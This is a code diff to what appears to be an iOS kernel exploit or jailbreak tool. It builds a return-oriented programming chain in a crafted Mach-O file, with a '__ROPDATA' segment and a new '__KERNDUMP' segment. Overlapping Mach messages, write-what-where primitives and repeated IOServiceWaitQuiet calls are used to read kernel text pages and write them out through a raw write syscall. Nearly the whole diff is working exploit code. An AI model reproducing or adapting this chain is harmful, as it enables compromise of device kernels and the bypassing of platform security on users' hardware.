@@ -1006,7 +1006,6 @@ StoreR0(push, where)
         char mscratch[8192];
         char scratch[8192];
         mach_timespec_t waitTime;
-        char kern_pages[0x100 * 0x1000];
     } args_t;
     
     args_t args_s;
@@ -1491,7 +1490,12 @@ step(i);\
     argss->waitTime.tv_sec = 1;
     argss->waitTime.tv_nsec = 1000000;
     RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(gasgauge_), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
-    //RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(gasgauge_), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
+    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(gasgauge_), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
+    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(gasgauge_), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
+    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(gasgauge_), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
+    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(gasgauge_), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
+    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(gasgauge_), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
+    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(gasgauge_), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
     [dy setSlide:dy.slide-1]; // exit thumb
     SendMsg(PUSH, overlapped_port, oolmsg_template_512);
     
@@ -1560,7 +1564,9 @@ step(i);\
     RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_text_base),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
     [dy setSlide:dy.slide-1]; // exit thumb
     
-    for (int i = 0; i < 0x100; i++) {
+    char* kern_dump = (char*)0x54000000;
+
+    for (int i = 0; i < 0x70; i++) {
         ReadWriteOverlap();
         tmptoscratch();
         LoadIntoR0(PUSH, SEG_VAR(kern_text_base));
@@ -1572,10 +1578,7 @@ step(i);\
         ReadWriteScratchOverlap();
         
         ReadWriteOverlapped512();
-        [dy setSlide:dy.slide+1]; // enter thumb
-        RopCallFunction9Deref1(PUSH, @"__platform_memmove", 1, SEG_VAR(tmp_msg.desc.address), SEG_VAR(kern_pages[(i * 0x1000)]), 0, 4096, 0, 0, 0, 0, 0, 0);
-        [dy setSlide:dy.slide-1]; // enter thumb
-        RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd2), SYS_write, 0, SEG_VAR(kern_pages[(i * 0x1000)]), 4096, 0, 0, 0, 0, 0);
+        RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd2), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 4096, 0, 0, 0, 0, 0);
     }
     
     
@@ -1586,7 +1589,7 @@ step(i);\
     tmptoscratch();
     WriteWhatWhere(PUSH, 0xFFFFFFFF, SEG_VAR(scratch[1024 - 0x58 + 0x20])); // make sure this does not get free'd
     ReadWriteScratchOverlap();
-    
+
     RecvMsg(PUSH, 300, tmp_msg);
     RecvMsg(PUSH, 300, tmp_msg);
     RecvMsg(PUSH, 300, tmp_msg);
@@ -1594,6 +1597,7 @@ step(i);\
     RecvMsg(PUSH, 300, tmp_msg);
     RecvMsg(PUSH, 300, tmp_msg);
     
+
     RopCallFunction2(PUSH, @"___syscall", SYS_exit, 42);
     
     memset(&argss->structData[0], 0, 1024);
@@ -1623,6 +1627,17 @@ step(i);\
     load_cmd_seg.filesize = round_page(sizeof(args_t)) + 0x1000;
     load_cmd_seg.vmsize = round_page(sizeof(args_t)) + 0x1000;
     strcpy(&load_cmd_seg.segname[0], "__ROPDATA");
+    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
+    mh.sizeofcmds += load_cmd_seg.cmdsize;
+    mh.ncmds++;
+    memcpy(buf + fsz, argss, sizeof(args_t));
+    fsz += load_cmd_seg.filesize;
+    
+    load_cmd_seg.vmaddr = 0x54000000;
+    load_cmd_seg.fileoff = fsz;
+    load_cmd_seg.filesize = 0;
+    load_cmd_seg.vmsize = 0x10000000;
+    strcpy(&load_cmd_seg.segname[0], "__KERNDUMP");
     memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
     mh.sizeofcmds += load_cmd_seg.cmdsize;
     mh.ncmds++;
